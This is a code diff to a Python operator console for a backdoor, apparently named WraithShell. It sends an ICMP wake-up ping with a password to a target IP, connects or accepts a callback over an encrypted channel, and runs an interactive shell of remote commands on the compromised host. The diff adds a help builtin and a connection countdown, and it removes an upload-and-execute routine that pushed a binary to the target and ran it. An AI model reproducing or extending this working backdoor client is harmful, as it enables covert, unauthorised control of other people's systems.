@@ -27,6 +27,9 @@ class WraithShell:
     def add_command(self, name, handler):
         self._commands[name] = handler
 
+    def display_help(self):
+        print("Available builtins: " + ", ".join(self._commands.keys()))
+
     def repl(self):
         readline.parse_and_bind('tab: complete')
         while True:
@@ -39,9 +42,11 @@ class WraithShell:
                 if name in self._commands:
                     cmd_handler = self._commands[name]
                     cmd_handler(self._client, argv)
+                elif name == "help":
+                    self.display_help()
                 else:
-                    prettyconsole.print_error("No such builtin!")
-            
+                    prettyconsole.print_error("No such builtin! Try .help for a list of builtins!")
+
             elif len(cmd.strip()) > 0:
                 self.execute_remote_command(cmd)
 
@@ -63,7 +68,7 @@ class WraithShell:
 def tcp_connect(host, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    prettyconsole.print_info("connecting to {0}:{1}".format(host, port))
+    prettyconsole.print_info("Connecting to {0}:{1}".format(host, port))
 
     try:
         sock.connect((host, port))
@@ -71,14 +76,14 @@ def tcp_connect(host, port):
         prettyconsole.print_error("Connection refused")
         raise SystemExit(-1)
 
-    prettyconsole.print_success("connection established!")
+    prettyconsole.print_success("Connection established!")
 
     return sock
 
 
 def tcp_listen_once(port):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
-        prettyconsole.print_info("listening on port {0}".format(port))
+        prettyconsole.print_info("Listening on port {0}".format(port))
 
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listener.bind(("0.0.0.0", port))
@@ -86,7 +91,7 @@ def tcp_listen_once(port):
 
         sock, addr = listener.accept()
 
-        prettyconsole.print_success("accepted connection!")
+        prettyconsole.print_success("Accepted connection!")
 
         return sock
 
@@ -105,20 +110,6 @@ def send_wakeup_ping(target_ip, callback_ip, port, password, delay=0):
         wakeup(0)
 
 
-def upload_execute(client, shell, args):
-    lfile = args.src
-    rfile = args.dst
-
-    with open(lfile, "rb") as fd:
-        payload = fd.read()
-        prettyconsole.print_info("uploading %d bytes" % len(payload))
-
-    client.send_command(3, 0, struct.pack("256sI", rfile.encode("utf-8"), 700) + payload)
-    cmd = "PATH={0}:$PATH {1} ; chmod +x {1}".format(os.path.dirname(rfile), os.path.basename(rfile))
-    prettyconsole.print_info("executing binary")
-    shell.execute_remote_command(cmd)
-
-
 def main():
     parser = argparse.ArgumentParser()
 
@@ -128,14 +119,6 @@ def main():
     parser.add_argument("--port", "-p", help="Listen port", default=0, type=int)
 
     parser.add_argument("ip", help="Target IP address")
-
-    subparser = parser.add_subparsers(title="subcommands", dest='subparser_name', description="valid subcommands")
-    
-    shell_parser = subparser.add_parser("shell")
-
-    upload_execute_parser = subparser.add_parser("upload_execute")
-    upload_execute_parser.add_argument("--src", "-s", required=True, help="Source file to upload")
-    upload_execute_parser.add_argument("--dst", "-d", required=True, help="Destination file")
 
     args = parser.parse_args()
 
@@ -147,18 +130,29 @@ def main():
     try:
         key = bytes.fromhex(keystr)
     except ValueError:
-        prettyconsole.print_error("invalid key specified")
+        prettyconsole.print_error("Invalid key specified")
         return
 
     if port == 0:
         port = random.randint(32768, 61000)
 
     if password:
-        prettyconsole.print_success("sent ICMP wake up command to {0}".format(target_ip))
-        prettyconsole.print_info("backdoor will listen on port {0}".format(port))
+        prettyconsole.print_success("Sent ICMP wake up command to {0}".format(target_ip))
+        prettyconsole.print_info("Backdoor will listen on port {0}".format(port))
         send_wakeup_ping(target_ip, args.callback, port, password)
-        time.sleep(4)
 
+        sys.stdout.write("\nConnect in")
+
+        for i in range(0, 4):
+            sys.stdout.write(" " + str(4 - i))
+            sys.stdout.flush()
+            for j in range(0, 3):
+                sys.stdout.write(".")
+                sys.stdout.flush()
+                time.sleep(.3)
+
+        print("\n")
+    
     client = S20Client(key)
 
     if args.callback == "0.0.0.0":
@@ -168,11 +162,9 @@ def main():
 
     shell = WraithShell(client)
 
-    if args.subparser_name == "shell":
-        prettyconsole.print_info("entering interactive shell")
-        shell.repl()
-    elif args.subparser_name == "upload_execute":
-        upload_execute(client, shell, args)
+    prettyconsole.print_info("Entering interactive shell. Type .help for a list of builtins.")
+
+    shell.repl()
 
 
 if __name__ == "__main__":
